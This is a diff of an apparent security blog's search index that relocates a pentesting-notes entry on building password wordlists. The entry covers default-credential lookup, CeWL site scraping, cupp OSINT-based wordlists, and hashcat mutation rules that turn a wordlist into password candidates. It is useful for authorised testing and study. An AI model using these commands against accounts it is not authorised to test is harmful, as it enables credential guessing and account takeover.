-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> custom.rule</span><br><span class="line"></span><br><span class="line">:</span><br><span class="line">c</span><br><span class="line">so0</span><br><span class="line">c so0</span><br><span class="line">sa@</span><br><span class="line">c sa@</span><br><span class="line">c sa@ so0</span><br><span class="line">$!</span><br><span class="line">$! c</span><br><span class="line">$! so0</span><br><span class="line">$! sa@</span><br><span class="line">$! c so0</span><br><span class="line">$! c sa@</span><br><span class="line">$! so0 sa@</span><br><span class="line">$! c so0 sa@</span><br></pre></td></tr></table></figure>
-
-<h3 id="Applying-Hashcat-Rules-to-a-Wordlist"><a href="#Applying-Hashcat-Rules-to-a-Wordlist" class="headerlink" title="Applying Hashcat Rules to a Wordlist"></a>Applying Hashcat Rules to a Wordlist</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat --force our-wordlist -r custom.rule --stdout | <span class="built_in">sort</span> -u &gt; mut_password.list</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Enumeration</category>
-        <category>Users &amp; Passwords Enumeration</category>
-        <category>Writing Custom Wordlists and Rules</category>
-      </categories>
-      <tags>
-        <tag>Creds</tag>
-        <tag>CeWL</tag>
-        <tag>Cupp</tag>
-        <tag>Hashcat Rules</tag>
       </tags>
   </entry>
   <entry>
@@ -1425,6 +1374,57 @@
       <tags>
         <tag>mimikatz</tag>
         <tag>Invoke-TheHash</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Writing Custom Wordlists and Rules</title>
+    <url>/2025/12/04/Writing-Custom-Wordlists-and-Rules/</url>
+    <content><![CDATA[<h1 id="Default-Credential"><a href="#Default-Credential" class="headerlink" title="Default Credential"></a>Default Credential</h1><h3 id="Creds"><a href="#Creds" class="headerlink" title="Creds"></a>Creds</h3><p>Installation </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install defaultcreds-cheat-sheet</span><br></pre></td></tr></table></figure>
+
+<p>Example :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">creds search tomcat</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">creds search mysql</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="CeWL"><a href="#CeWL" class="headerlink" title="CeWL"></a>CeWL</h1><blockquote>
+<ul>
+<li>Depth to spider (<code>-d</code>)</li>
+<li>The minimum length of the word (<code>-m</code>)</li>
+<li>The storage of the found words in lowercase (<code>--lowercase</code>)</li>
+<li>The file where we want to store the results (<code>-w</code>)</li>
+</ul>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl https://website -d 4 -m 6 --lowercase -w wordlist.txt</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Cupp"><a href="#Cupp" class="headerlink" title="Cupp"></a>Cupp</h1><blockquote>
+<p>We can perform OSINT gathering and feed the collected information into <code>cupp</code> to generate a personalized wordlist.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cupp -i</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Hashcat-Rules"><a href="#Hashcat-Rules" class="headerlink" title="Hashcat Rules"></a>Hashcat Rules</h1><h3 id="Predefined-Rules"><a href="#Predefined-Rules" class="headerlink" title="Predefined Rules"></a>Predefined Rules</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ <span class="built_in">ls</span> /usr/share/hashcat/rules/</span><br><span class="line"></span><br><span class="line">best64.rule</span><br><span class="line">dive.rule</span><br><span class="line">generated2.rule</span><br><span class="line">rockyou-30000.rule</span><br><span class="line">hob0rules</span><br></pre></td></tr></table></figure>
+
+<h3 id="Writing-Custom-Rules"><a href="#Writing-Custom-Rules" class="headerlink" title="Writing Custom Rules"></a>Writing Custom Rules</h3><blockquote>
+<p><code>:</code>      Do nothing<br><code>l</code>      Lowercase all letters<br><code>u</code>      Uppercase all letters                        <br><code>c</code>      Capitalize the first letter and lowercase others<br><code>sXY</code>   Replace all instances of X with Y                <br><code>$!</code>     Add the exclamation character at the end</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> custom.rule</span><br><span class="line"></span><br><span class="line">:</span><br><span class="line">c</span><br><span class="line">so0</span><br><span class="line">c so0</span><br><span class="line">sa@</span><br><span class="line">c sa@</span><br><span class="line">c sa@ so0</span><br><span class="line">$!</span><br><span class="line">$! c</span><br><span class="line">$! so0</span><br><span class="line">$! sa@</span><br><span class="line">$! c so0</span><br><span class="line">$! c sa@</span><br><span class="line">$! so0 sa@</span><br><span class="line">$! c so0 sa@</span><br></pre></td></tr></table></figure>
+
+<h3 id="Applying-Hashcat-Rules-to-a-Wordlist"><a href="#Applying-Hashcat-Rules-to-a-Wordlist" class="headerlink" title="Applying Hashcat Rules to a Wordlist"></a>Applying Hashcat Rules to a Wordlist</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat --force our-wordlist -r custom.rule --stdout | <span class="built_in">sort</span> -u &gt; mut_password.list</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Enumeration</category>
+        <category>Users &amp; Passwords Enumeration</category>
+        <category>Writing Custom Wordlists and Rules</category>
+      </categories>
+      <tags>
+        <tag>Creds</tag>
+        <tag>CeWL</tag>
+        <tag>Cupp</tag>
+        <tag>Hashcat Rules</tag>
       </tags>
   </entry>
 </search>
